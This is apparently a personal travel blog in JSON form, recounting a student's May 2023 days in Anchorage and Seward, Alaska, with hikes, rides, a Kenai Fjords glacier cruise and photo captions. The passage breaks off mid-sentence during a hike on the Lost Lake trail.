{"title": "Visiting Anchorage", "date": "Tue May 16 2023 19:40:24", "type": "alaska", "body": "<h2 id=\"section\">514</h2>\n<p>Today I stayed at Anchorage.</p>\n<p>I previously planned to go to Seward tomorrow but it seems like there\nare no tickets left, so I am going to Seward the day after tomorrow. I\nslept pretty much all morning, and went to downtown in the afternoon. I\ndropped my bag off at the hotel, and carried my backpack. I first\nplanned to go to downtown, but the road wasn't suitable for walking and\nit was like 3 miles to downtown, so I ended up taking a bus. The bus is\nvery convenient, though.</p>\n<p>The views is spectacular, in fact, I am sure I won't be amazed by\nnormal sceneries. The scenery in Alaska in just on another level\naltogether. I could see mountains covered with ice in Delaney Park, and\nsee all the way to the other side of Knik Arm.</p>\n<p>It was hot today, and I ended up with only 1 layer of clothing and\ntaking 3 on my hands, thinking it was hot. As a result, I got tired soon\nfrom walking, and my feet was sore. I went around and got into a visitor\ncenter, where I chatted with 3 people for a while, then went to visit\nthe museum. But I was sore, so after a quick visit I went back and\nchecked in at the airbnb.</p>\n<p>The airbnb is much much better than the hotel, with only half\nprice.</p>\n<p>There are almost no homeless people in Alaska. There are few black\npeople, but all taxi drivers and bus drivers I encountered are black.\nPeople here are friendly, and some will stop and say hi and I walked\nby.</p>\n<p>I went to the Earthquake Park and Point Woronzof Beach. It was long\nwalk. I went there from the Lake Spenard, and it was so beautiful. I\nalso saw helicopters.</p>\n<p>It was hard to walk since there are almost nobody walking and cars\ndominate the road, however, the view was spectacular.</p>\n<p>I like the beach in Anchorage, which is more than 30 degrees north in\nlatitude to beaches in california. I ended up getting back on Lyft since\nI was too tired to walk.</p>\n<h3 class=\"photos1\" id=\"photos1\">Photos</h3>\n<p><br />\nMidnight Sunset outside Ted Stevens Airport<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/ziFcv5ZsgLjhYD617bDNTDJfhhmuTkauZfGxHQ1LJ8vSZk0IVO9-ijWBU0KGHVBQpUm2XaJgexR6AFaooOwlL5gxUw-fn7r9aw2lLfaYPz5LGIHMWXDAWYCjHVHaA8k6C84RiD3b9sSrKZN1ucCs8dM=s800\" /><br />\n<br />\nDowntown Anchorage<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/F6wXRJVFI6Ptl38ABdm6eE61G_RczPGKoRPq8BzhVBYRGknj8rDb1KjubeTqwcnChYVntlkeKgCBxWLn0JZTw-H12giOjtND0Rc429gSSJmcw1BjTOCFpSSzK_6X8CHzz2ycxyW_xLFOtBeA7IIk_0Y=s800\" /><br />\n<br />\nNorth Coastal Trail<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/6bO8bwF0nU_sZ7fSq_xQpJ1dhr_oJibqpbnHRFVTA60e6lWa5FV4JeHHVyRZEHcdpWppiC5mkXI87s1zBzLOdlSf0yBxNtVYb6iGyIL0U1fZqcvpvyOsLXO_icoRDOjB475vlRzLfiOExA2KG0yQXnc=s800\" /><br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/UEEh1Y3EdsAwbPy3XusxQe2LbOwTVvEKbrj1pEQBca3BXBAuSOM5AJqh0P8p73ArAT2EjAwYeAK_0Vyadqe5K_-e4_bvq2qocRAeHklTONTuQFpJOWqwRgH-AdcUkrtxq02jmITFxZjpHRK3cxeEa_M=s800\" /><br />\n<br />\nDelaney Park<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/4HA1DgZMkepbqJ9aTV9tyXJUQH6uYWks0GCUib99NCT9YM31GMC2i9dVDiFOqrtLobZpafNfSi_oG3F-eUakKpfW09vSDfg23NtftNGokHXYi5fJtkCHN0-2Js1EKMrfUaNcjXKzIXoC0UGsuEsoOVA=s800\" /><br />\n<br />\nAnchorage Museum<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/dhNOyNW6iEdHEdF0cJCUxb-7yhC2abIxJmDEtYSeF7FrUKmTuc1546X7-gg3vDt51dPb5sKSVvBp-CMkdZYa88CeXU4pnCir_yqB_lZ0caL8jHJcdnO733lhwyeXhhclir1hxQMoB8cqk1gTJxwG0M8=s800\" /><br />\n<br />\nLake Spenard<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/gLRo7wHXL_SDR6t_lsZbD7DUw80xahqs3Z7bhRTSQnI0HV35mEEjnsAaaJ8i8_PIRente6PF9qhSgG9xPAvgFnldXfelq2auH8EjUBaYGpnFUDwSUeMQqvl1f__6IypYmfzqUDW9fcoANsYJjmyaqJQ=s800\" /><br />\n<br />\nLake Hood Seaplane Base<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/POCFrlqWzxVwwXh0_3654zEmyE81lMOxVGc9mcj8IcA9P-b9tnVUZjSS3SaSa9fSJoKATcI6MnP2zO_-bvKFgDBKyzPvsQnYP2eCXlfcQQFlXPZSLoHwV3Cn7lpVHrPiRMILrOgbkjP84dK3qHexzXQ=s800\" /><br />\n<br />\nEarthquake Park<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/8XBN8bi8Om1S7ZQ8hbSz7XCQzFoUVPevDZwV2ZLwehZl5zu_xM2C9VTe5xhA29dJWaakAZ9mcNRpMSohoGnAW05CnAvgxwSl4K0NbNc58B5xR_nNYxqd84Fg_Oc559HoXDeKzdABC1iFKz9ESIpvuZM=s800\" /><br />\n<br />\nPoint Woronzof<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/yZ4mtTmCPJGSmNTU9JgAcoE3h2ZZhp4PCXqA6rdVhW7Gc4tYDrRmFFthkJmCYrPADhKfW-eikldeXltzgrNKNOUXtJkb7Ef-xn7t0eWhUSl3Mf_ptNUDLDNC_wPMm4M-QtG5VeKdhWSlhiOrE37PGzQ=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/eLhbim1OVZ3g9wBBS6ci8JdTRX3rxZRQpo4mLYh54vOcFkvFS7oMWHffEg35ofD6zcypjED_awtLCoHwVRmeJZr7Vi0rJhr-mblHfVqfj7OfYrrX7o4V4xa35HsoSS_EW4AmCr-WFTQdOYo-ZNqy_WU=s800\" /><br />\n</p>\n<h2 id=\"section-1\">515</h2>\n<p>Today is 515.</p>\n<p>I slept all morning because for strange reasons I wasn't sleeping\nearly last night, and I realized how poorly planned my travel is. I\ndidn't even finish booking for the tickets. I spend two hours at noon\nbooking everything and trying to wrap things up, but turns out that I am\nspending so much money on this trip. I booked an airbnb in Seward for a\nquite expensive price, and it didn't even include storing luggage after\ncheking out and shuttle, so I had to do everything myself.</p>\n<p>I initially planned to take a bus to midtown, but for some reasons\nthe bus didn't come, and in Google Maps it also didn't show that the bus\nis coming, so I ended up taking a lyft.</p>\n<p>I took a lyft to midtown and hiked around. The driver was chatty, and\nwe talked for a while. He told me his son is also a sophomore studying\neconomics at Boston with full scholarships, which I thought is much\nbetter than me, although he wanted his son to study engineering. He also\ntold me he grew up in orange county, and how he thought Europe is better\nthan US because of homeless problem. Overall he is very friendly guy. He\nmentioned that Puffin Inn is really bad, and there are shootings and\nshady people. I told him about my school and life too. The ride was too\nshort for a long chat, and we parted at Cuddy Park.</p>\n<p>Cuddy Park is mostly empty and there is a big lawn, but on the other\nside there are worn-down tents. That is the first time I saw\nhomelessness in Alaska.</p>\n<p>Midtown is very dirty, and poorly constructed, the roads almost wild\nand not suitable for pedestrians to walk. I walked very hard and\nconstantly looked at my phone. Then I walked to Chester Creek and walked\nalong the trails. There are also many other people walking and cycling\non the trail. Goose Lake is very beautiful, it is blue and I could see\nthe snowy mountains above the lake. There are some dogs from other\npeople which got me scared, though. But everything turned out all\nright.</p>\n<p>Then I went to University of Alaska, Anchorage. I thought the campus\nis very beautiful. In many places in China, the trees and grasses and\nlawns looks as though they are artificial--human made for recreation and\ngreeness. However, this campus looks as though it is constructed out of\na natural reserve. The campus is big and there are parking lots\neverywhere. In contrast, Berkeley looks dense and crowded. But I know\nthis is not the kind of university my parents would gladly let me go to,\nalthough I think it is really nice. I went into several school\nbuildings, which are open to the public, and got some water. There are\nalmost no people in the campus, and every building is connected to a\nparking lot. It is really hard to get around without a car. There is a\nfigure skating podium in the university and I think it is nice. Anyways\nAnchorage is much nicer than Berkeley but of course my parents won't let\nme go there for school or anything like that so there is no question\nafter all. Maybe I can come and be a teacher here after graduation, and\nwith a car I can go to glaciers and National Parks every weekend. Ah,\nimagine that.</p>\n<p>Then my legs got really sore and I had to go. I went to Lake Otis.\nThere is some park called Jacobson Park without a road on the map, and I\nwent in through a wild trail. The trail was so bad that half of it is\nwet, then I saw someone with a tent. I hadn't thought it strange and I\nwas like \"Sorry\", and then I saw that there are no roads ahead I was\nlike \"I am turning back\". Then I heard him say something like \"Can you\nspare me a dollar?\", and I got kind of scared, but since I am not sure I\njust kept going away at a faster pace.</p>\n<p>I walked around and it seems that the roads there are consists of\npopular university names like Duke, Stanford, Princeton, but there are\nno Harvard or Berkeley, which is strange. People were watering their\nlawns and a elderly woman said hi to me, which I replied the same back.\nBut by the time I almost couldn't continue walking. I sat on the ground\nnearby and called lyft.</p>\n<p>Then I decide to call it a day since I am leaving early morning\ntomorrow, and it is really hard for me to get up early, so I must\nprepare well. On the lyft back the driver chatted with me, and he asked\nmy information and I told him I was getting A or A- or B+ this semester,\nand he was like \"everything is A+, you should work harder\". And I\nthought again just how lazy I am, and how I would try to work harder\nnext semester, which is merely a thought in my head for pretty much all\nmy life. He also told me how he was feeding those homeless in Anchorage\nand there are 300 in total, some of them die of frost in winter. He said\nhe could take me around town and I told him I wanted to go to Kincaid\nPark, but since it is ordered in Lyft we just finished the trip and\nparted. Both lyft drivers aren't black this time.</p>\n<p>I ate at subways three times in two days (I only had 5 meals in\ntotal), but I think it is pretty nice.</p>\n<p>After two days of hard hiking I think I saw the equivalent of half a\nday of car driving, however, I think that walking is another unique\nexperience anyways.</p>\n<h3 class=\"photos2\" id=\"photos2\">Photos</h3>\n<p><br />\nAirbnb Malibu Road<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/OZCFzQfT-VjNfnhIhwIwnH4YYWy9Nw1sGzmajYCSb6GUo9MZ0lkknK7669MDSFT3pMjIYnVHB-Vvc5gZy_RYVE2fjm4ZyyVNoQGniJbmQM63ErPbhKpCtF7M0Mr-kwj-tNGor0xrByaKEsFBlw2WGsU=s800\" /><br />\n<br />\nMidtown: Homeless in Alaska<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/h36i8c-zqrnX7Z08xT5A9sp_EUAsPiBAez9d2dGWQFbcKFH6sok1ASqAy6Upe51Z69SuNKiTQR0JF3cfTqY7T-HXejG-mp_5iawLflWxWm9rAV0DgjZN5P-bb_q21ApNEtxD96WFaSijmxaK-MGM_9Q=s800\" /><br />\n<br />\nGoose Lake<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/EXVEXhuD9QDDBo3TUscDYdeDpJXPGp34D9iVRNdzS9VJGDbTXTQQyyvhwZ1i2GXfzzwbKuYLlUcZQ4el2hWLxTYZUb7DdQAGnUgHce5Px38B0dTT5qxxFj5bHAtDHIg5CR2ppXLYc4VMNySi00T_BH4=s800\" /><br />\n<br />\nUniversity of Alaska Anchorage<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/kvAk_gFW0WgsfMSySaNVBldsls9rCPbyW31jFenHlWGd-YFmy7n6kMv6VLygorl3_jzzjLTLoDzMnC1afolyhVvuNnqpiYGGd9KzWOhl2HJgjOzsygNeiVukB2ThmH8E8r7nV0gxHZ7U5u50Gh9DKBg=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/VzSGkJ7A5Eyl9vVBzbv9AWBVHxl3O1to-Yriu97yLexhEBb44LVg_IigPVkYXk64njM95bMXZgZQDPOY9krQM5oboCPio72YCCnokX45HRrILCf-k0f98oi90hN3_JtTpbiVe-WOOLxXbccGeURtW04=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/flcIzTSKFrtdfGwueNaOU_z9zPbQKolzyV1ZARrNuIX7I788MxQzZuPdXKmaG19yg_zNOGAubQZ3IrcUFKWK6uruzTvfxWGSlquQ6t9I7ulP_YvA0qRq1prnvC3n_OS7tgkQZqyaY7_cE6dz0FsxpTo=s800\" /><br />\n<br />\n</p>\n", "_id": "66689633547d3fe098118747"}
{"title": "Visiting Seward", "date": "Fri May 19 2023 21:23:32", "type": "alaska", "body": "<h2 id=\"516\">516</h2>\n<p><br />\n</p>\n<p>Today is 516 and I am departing from Anchorage to Seward. I got up\nsuper early at 5 am to catch up the train at 6:45 am. The lyft drive was\nso fast and I got to the station at 526 am more than 1 hour earlier.\nEarly morning is so struggling for me, but I feel pretty well today.</p>\n<p>I walked around in downtown and the sun was just rising over the\nmountains, it was so beautiful. But there are some homeless people\nsleeping on the ground so I tried to avoid them.</p>\n<p>However, due to an avalanche the train was cancelled, and instead\nthey offered a bus service from Anchorage to Seward with the same\nschedue, so I got on the bus and I am stuck on the road now.</p>\n<p>The drive was so beautiful, almost otherworldly. It made driving\nalong the highway very tempeting for me, and I will try it some time in\nthe future. But back to the bus drive. We first got out of Anchorage,\nfrom downtown to midtown, and along Seward Highway. On the road I\nrecognized some places I hiked the day before. So much faster with\ncar!</p>\n<p>The driver is very interesting man and acted as a commentary along\nthe way. We have 2 stops along to take photos and stretch, and they are\namazing stops.</p>\n<p>We went around Gulf of Alaska and the driver explained that it was\ncalled turnagain because that the tide rise and fall so quickly, and\nthat at 6 am in the morning it is highest, but by the time we got to\nSeward the Gulf would be almost empty. Captain Cook discovered this\nplace. Also, they couldn't construct a bridge across the Gulf because\nthere are only mud in the mountains, no rocks.</p>\n<p>The driver said that we might spot Dull Sheep or Bears on the road\nleft of Seward Highway, and \"call [animal] left/right if you saw\", then\nsomeone called dull sheep left. But I didn't see anything, and we just\npassed. The driver also said that there might be seagulls, swans, or\nsomething. Then we saw a trail of snow or ice which covered the tracks\nof the train and the driver suggested this is the avalanche that cuased\nthe train to cancel.</p>\n<p>The driver explained that there are no ecosystems in Turnagain,\nanimals come and go, and that sunlight cannot penetrate the water. Then\nwe passed to Girdwood and on my right there was many dead trees, to\nwhich the driver explained was once Girdwood, but in a 9.6 earthquake in\n1960s it caused a large tsunami, which flooded nearly all of the sea\ncities, including hope and sunrise. The dead trees are salty and rocky,\nnot like rotten dead trees, since they drank the salt water in the\ntsuname.</p>\n<p>Then we stopped at Girdwood as some passengers may be getting on the\nbus, I run around and took some pictures. There was mountains all\naround, and covered with snow.</p>\n<p>Then we kept moving and got higher and higher, to a parking lot where\nI could walk on the snow. The snow was very soft and when you stop on it\nyou leave a big footprint. I nearly got my shoes wet. I didn't walk far\nbecuase the stop was only 15 minutes. I could see the snow and ice\nstretching all the way to the top of the mountain. The scenery was\nbreathtaking and I took many selfies and let someone else took a photo\nof me. On the mountain among the rocks I can see remains of avalanche We\ngot to Moose Pass, where it was a small town with few hundred people,\nand that there are not a gas station. I spotted an elementary school and\nI wonder how it feels like to study there, since there are less than\n1000 people there might not be enough students for even 1 class. Then we\npassed the Trial Lake. The lakes here comes from glaciers and is\ngreeish-blue. The lake is so calm and beautiful and I thought about the\nlake and mountain I saw in Switerland but couldn't recall much since\nthat was many years ago. We went along Kenai Lake, and we are currently\nstopping with Kenai Lake under our feet. The Kenai Lake is shaped like S\nor Thunderbolt, and it is very very long. It is the best place for\nSalmon fishing, and they would go \"combat fishing\", shoulder to shoulder\non the ground.</p>\n<p>The mountains are covered by green pine trees and bushes up to a\ncertain height, then it begin to get white.</p>\n<p>The driver said that there are only 3 seasons in Alaska, winter,\nalmost winter, and construction, and since it is expanding this highway\nthere is only 1 way to go, and now we are on the way again. It is\nraining hard at this time.</p>\n<p>We arrived at Seward pretty soon, and I went looking for Orange Bike\nluggage service. Turns out the door is locked but there are 2 young\npeople with the tag on the road, so I deposited my bag. It was like 11\nam, and it was raining so hard the town looked worn down, and there is\nalmost nothing I can do. Then I went to Kenai Fjords tour which I\npreviously booked in 517, and I asked if I could change the date and\nthey said they could, and I got on the boat at about 11:30 am.</p>\n<p>It was raining pretty hard. Only as I got on the boat did I realize\nthat I haven't been on a real cruise before. I did remember going on a\nsea or lake a few times maybe, but the ship is so slow and so peaceful\nthat I could barely feel anything. However, today it is absolutely\ndifferent, as it was rainy and windy, and when I went on the deck the\nwind blew so hard that I couldn't stand without hanging to the railing.\nAnyways, I went back inside and found a seat at the front of the boat\nacross 2 elder woman, and they asked me to take a picture of them and I\nasked them to take a picture of me in return.</p>\n<p>The boat was almost like riding on a rollar coaster, as it goes up\nand down. I couldn't even stand at first. But eventually I got used to\nit. I saw some young people going outside at the front of the boat, so I\nwent out too. The wind blew water in my shoes, but it was fun standing\nright there nevertheless. We kept going and it felt more like a cruise\nout to the sea than a national park tour, as I had imagined. The captain\nhad a harsh and deep voice, and I couldn't hear him well inside the\ncabin. The captain announced we are going 110 miles, and off we\nwent.</p>\n<p>After a while I heard the captain call \"orca\", and the ship slowed\ndown. Many people went out to shoot photos. There is a black tail there,\nand the captain explained that it is the fastest swimmer, going as fast\nas 30 mph. Then the ship started again. The mountains are surrounded by\nfog, and I couldn't see much. Everything around looked misty and\nmagical.</p>\n<p>Then we went to see glaciers, and it was the most stunning thing I\nhad ever seen in my life. It looked so pure. There are floating icebergs\non the sea, and as the boat went around I could hear crack crack as the\nicebergs hit the boat. I saw like 7 people kayaking around, and it had\nalready been quite a time on the speedy boat, so I don't know how these\npeople had managed to get all the way here, and how they had managed to\novercame the freezing temperatures. It was very cold outside, and my\nfingers went frozen. Almost everybody else had gloves. There are eldely\ncouples and young man, mothers bringing their young children. It was a\nlovely site as everybody was taking photos and selfies and looking\naround.</p>\n<p>The glacier came between mountains, and it was sort of white-blue\ncolor. I wonder if there is some fantasy kingdom on there, as it looked\nlike in those disney movies. The glacier looked too magical, coming out\nof nowhere and shaping itself in beautiful curves. There are icebergs\nfloating all around, and they stretched in all directions, all the way\nto the mountains. Then one of the crew members picked up one iceberg\nwith a fishnet, and showed it to us to touch, claiming it had been there\nfor hundreds of years. I couldn't describe it better in words, but after\nseeing that I find the trip very worthy.</p>\n<p>Then we went to see a second glacier, and I heard noise of ice\nfalling to the ground. Among the iceberg there is a whale, and it would\noccasionally come up to the water to breath the air. There is also a\nsmall hill with no trees, and there are some caves in it.</p>\n<p>I got very sleepy since I didn't get much sleep last night so I dozed\noff. Then it was 4 pm when I woke up, and the rain stopped, the day\nbecame cloudy and rays of sunshine penetrated the cloud to the\nocean.</p>\n<p>Then we went to see seals, and there are fat, slippery and cute just\nlike in documentaries, where polar bears would try to snatch up as their\nfood. There are many seals resting on a rock on the ground. But there\ndoesn't seem to be polar bears here. The ocean became blue as we came\nback, and the mountains were clear. We then went to Fox Island to pick\nup people, and I wonder how it feels like to live on the island.</p>\n<p>Then I think it is time to call it a day and I went for my luggage\nand came to the airbnb. I think I really love Seward and I am enjoying\nmy days.</p>\n<h3 class=\"photos1\" id=\"photos1\">Photos</h3>\n<p><br />\nSunrise<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/yXInqKS-DNSRqHZw8QnaxejYm-rgeS6SIK-_0P0AVlyKDizKl9BrKuOhcT1aGE6NYsQ_DsMcBh2Uq3qPZgOf732oz-7YrQbaIFUpPVPtJVQeuSyWiFAYnY3j6VZKDHbvffS0kFu5d4bACujxPajcW_4=s800\" /><br />\n<br />\nTurnagain Arm<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/HltZzQ87ouSoxWHqlhfxMtqR44jGsG3JsX9Mh7ausnlowqanI2g6d7M_1sxveezI8g8j0p6dxlOQB1R37cOVt4LIONLt6Z3G_FsvzffAOLK4_riYZeCkKY2Dt7pNylP4fOeTQZOotdgi-u8fKSBlrvU=s800\" /><br />\n<br />\nGirdwood<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/dKGlxosdgCPf20CTmE_8-FxPpzgJ8T8d7xRM5Jb7rQjP0dVkuu8grSWWR-rNeb9xGOYzK-yptGntOqoJ9sOhyZmt7zHgnMzn0aDjXfm7vAMVaHZZpjmSE5IsGls3NGONqYce5qR25RJwoaVPaLJXrts=s800\" /><br />\n<br />\nChugach National Forest<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/GinQGeWBKGHXIQzyaBGS3FOaclbU-VENdDLLSx9UDuztL4jOPC7q6z1ZJn3qSxlspCEr0l98vAW8jD_xy4D37TFz6zmdtiOr4REqpFhBLULbOzF3mjcnNld7FgleuWZhTOmUZrFq7BHmeqRZMhQk9Ys=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/sdvHow7voBlZ-PQQ_pPwgGwU0NsspIGTdbYVGaWZ9KR0mKes48VdneL7UozZB-Zeb7Hze23dsVyDN7no5xJjowd18gHbP50l8zHuq8xndaTxFN_ZoA6JMMkEXcxCmabdrrN2dQytSsYES0o1FPzPLIU=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/97-tHgFFuZAImkYhG-AfUE2wOvx2Qudg3-uUZQaEa7Tt2Wvs60CgPe9WlJh_gb1r3SJNy7sq0DeHoLSPHlf0e3Jy0w98m3meurRdNdbz6wtJNotFmI4J71iR9UQRV-0hiDrQTYNsBJgcjcuw509JUjc=s800\" /><br />\n<br />\nJerome Lake<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/gRgsodj9ANJSXTwnnTJaFrnYnoPL7gPYRgLxxlVUr6d23h9Oj0iega1zSIU9rg6JqfspZVt_3Qh_ptTtCv3eG1J0G3lkmPlBB9uhehvDl6Odc97_DqtWjBIda4qV7M6V59au26QG_RMgYWyceGQrYjw=s800\" /><br />\n<br />\nTrail Lake<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/lgJirvDwS9YnewytJFQYr9uhc0ehzbsp0gn-dq7ZB5mOhnvq_A5M1MpnjTVl89wFZIblIQjAOU0EZr9DICCiqUakaTFrbaRfCdlfMtvo2zdqOe-xh-6sYxxZM8eK6oOblZiQLRmUliuXJj_XuVtMh28=s800\" /><br />\n<br />\nKenai Lake<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/cuKt1FGQuT9iOF9OBHJ2KKeU2g6NBjbOky8_oNvM3eb0jIkzE2N16dGemQeymjR9DDYrJhaRstUG5m_UETQq80r75ZOr9lUtMoPF2y1s6xR6QHoE1SpT60fgnzxkaJTDF6NRROViysPOj7ySnWkhK9I=s800\" /><br />\n<br />\nKenai Fjords Boat Cruise<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/psnjgdPs2m9Tdkkypz3VwPaUdy-7_--qBNo1llGzVbTqmhVW90TqH70eGgWCiqMu233sIXiolKjXO1WiLq6D6IPMSGhYYTSvaARTsDX0ixgNPaHtyM21ejf-Dac_vyFvOuXI7j-IjAULi6WlyuuI1lY=s800\" /><br />\n<br />\n<br />\nHolgate Arm<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/lFftsL36oyLqECXuvB42lTnOVALk6WfNBJzLjtXhSBzxatx1wL257tpj0RynCEhzbTa5UYDeNmuquFKj_5LzE1AdILxbCkb9OGH0JO7Ps_dvdRwJ6BN9qzU9uOmV9KlrgUC9s94tvmadE8R5sxy5k0Q=s800\" /><br />\n<br />\nHolgate Glacier<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/wkOezc5UAJQoE08XNJgbVdeHYlTCma7-0Mn4yeSZ1H0rheGSA-TwSAgzUPc1hRx0f-nheNK8JgNVbe2jSyTKBPXZkBGfcRPC8jMKuN4343CfEPmY0AGjtHhm0u8Z_ZfvPbYsLjE5vEIfga78pgjb6rg=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/asdkRWC0KiDG4qOCA4fgxwcMXhYaQOE7qgdE6admodeGUJAcoNC7YwM02s1QDeX9e0KjK_kSRLicNftHSL1acKaPaV2H2XkyD9pi5DL8onTWE_pvuEmbVs15xxzRzxyL0-3JAQahue7bNGOX1_KWe30=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/By288CkP9DzLQErT8_qTSj8EMopdVVzCY9Dznv-UolWtYHfgOpC1OdYeHXcyIFvYlIC42UeZsh0RebEDFqV78G1dJyFNfHFTUGAD0N9ATLv4NbD4RL36A5GTVfj0eBguMs6byLPcVQUUhaxCVSj-spk=s800\" /><br />\n<br />\nAialik Glacier<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/T_RT1lyoAgDO0XfEEm7suqCyyyrsPW898kj41zUHEYe9q9oJOmsjK7QJZTf43_N0uvzfrm7f8p7HDS7Zw8FhSDk5l3CnPyaiQNPzQeJVWOakcC4RRApJa5P5gksz5ff0jWvlxzdrJIQkWqIMx-kJHyU=s800\" /><br />\n<br />\nDerby Cove<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/c6B5hr4yuMKCBaPlGlvVuRwFmV1RbfEspGs0tw2JfeSGRrYTFdereYtFdrxxDJfAJQYTpfjgq-cgKiuRsJznlRU6uUvNuMFew0NLz4Hn5C2L6k16b1VNkrm3d4gmc6zpR0k8EG9DcS4rbjNW0TwFUSY=s800\" /><br />\n<br />\nAirbnb 3rd Street<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/qtUFmIsWU0b4X786dNtJaEVTyyWqmBmyYvvc8qSm2qb2J4NMA2ESFUVdys7utFC99O9QCVOShJWpL-eJzVWvcwIs0W6calTDY5fPLPyfsBU0ByoWIWSejw_kLLlXmKyx3WDYxK0GGBOFTN6ItozfNaY=s800\" /><br />\n</p>\n<h2 id=\"517\">517</h2>\n<p>Today is 517, and I slept half of the morning. The airbnb wasn't as\ngood as the last one, and in the morning the cars were very noisy.</p>\n<p>Then I wanted to go to the Seward visitor center. I first went out to\nthe two lake park, and there was a woman with a huge white dog. The dog\ncame after me, and the woman shouted \"friendly, he is friendly\". I\nmanaged to get away and went on the opposite direction to see the\nwaterfalls. Only at the park did I realize that I had been walking on\nwell-constructed roads nearly all my life, and hadn't seen a trail\nbefore. The trails are just basically a place where there are not a lot\nof plants going, that you can get through. I went to the waterfall, then\nwent back, and there was the woman and the dog again. This time it\nwalked up to me, and I was so scared, but it merely stopped in front of\nme and looked kind of cute and the woman smiled and said \"sorry\", to\nwhich I replied I am afraid of dogs. Then I walked to the 2 lakes and it\ntook me a long time to get out, and I was kind of sore.</p>\n<p>I was wanting to get a breakfast or lunch, and went to Ray's\nWaterfront. The servants are really nice but the price was so expensive.\nI ordered a hamburger and a dessert and it took me 40 dollars. I thought\nthat I would never eat at such a restaurant again, and that I would\nalways go eat and subway or something like that. Although it said only\nhamburger on the menu, the dish turns out to be hamburger and fries, and\nthere is a steak and some bacon and some mushroom in the hamburger. I\ndidn't even finish the hamburger, out of my expectation, since it is\nvery large. I then asked the people in the restaurant if it is plausible\nto hike up Mt Marathon, to which they replied that it is best to go with\na mate, and there is snow on top. I wanted to go to Seward visitor\ncenter but it was 1 mile away, and I didn't want to walk anymore, so I\ncalled them instead and asked about the trip. I took the whole dessert\nback. However, I spilled part of the dessert in my backpack, causing my\nbackpack to be flooded with milk and cream, which covered my pen case\nand water bottles, and I had to take time to clean it up.</p>\n<p>Then I went to Mt Marathon. There is a 5k race every 4th of July at\nSeward that is kind of a real popular event, and many people came to\nrace on Mt Marathon. But it was only mid May now. The trailhead is 100m\nfrom my airbnb, and when I walked up to it I saw a sign that said not\nfor inexperienced or unprepared, but the trail looks good enough, and it\nsaid \"jeep trail\", which I am guessing is for jeeps, so I climbed\nanyways.</p>\n<p>It is steep and I took many rests along the way, but overall not that\nhard. I was afraid of bears but fortunately I saw no animals, well\nexcept for maybe birds and squirrels. After the Jeep trail the mountain\nis covered with snow, and there was nothing I could to do to keep going,\nand that is about 1/3 of the whole trail. I was stil fresh, and walked\nalong a waterfall for a while and took some pictures before turning\nback. In total I met 3 people on the trail today, with one experienced\nmid-aged man going up and down very fast, saying he is going up 2 times,\nand an elderly couple, who didn't went up the trail much and said they\nwere only there for 2 hours.</p>\n<p>Then I went to Lost Lake trail. I wanted to go somewhere and went to\nHarbor 360 and asked how to go there, and they said there is shuttle but\nsomehow I didn't find any information of the shuttle on the Internet and\nthey said it is best to go in a taxi. So I went there in a taxi, and it\ntook me 25 dollars, and 50 dollars round trip, which I found very\nexpensive.</p>\n<p>So I went to the start of the trail and wanted to began hiking.\nHowever, there is a water spring blocking my way, and I suddenly began\nto feel a little sleepy. I wanted to find a way to cross the spring but\ncouldn't, and the road around was covered with snow. In the end I\nfinally stepped right into the icy water and crossed it. Then I went\nhiking and the trail was very rough, partly covered by snow. Halfway up\nI saw a man and I said hi and asked how far could I go. He said he went\non for 2 miles before turning back. The path is so hard I am always in\ndanger of slipping, and there are 2 trails, summer trail and winter\ntrail. I thought that since it is closer to summer now I would take the\nsummer trail. The trail is mainly small rocks and tree roots, and there\nis snow everywhere and snow is melting, causing the mud to be very wet.\nThere are bushes, but those shortcuts are hard. It is really hard\ncourse.</p>\n<p>However, the summer trail is just covered with snow and full of ups\nand downs, and before long I had to turn back since there is a cliff and\nwith so much snow it is very dangerous, and I had already climbed a\nmountain a little today and wasn't that fresh, so I turned back. Then I\ntried going to the winter trail. I saw two woman, and they were also\ngoing into winter trail. Somehow the winter trail is much easier than\nthe summer trail, and although they are both covered with snow winter\ntrail seems it is designed to be like that, and the road went on quite\nsmoothly. However, I was very tired in my legs and my water is 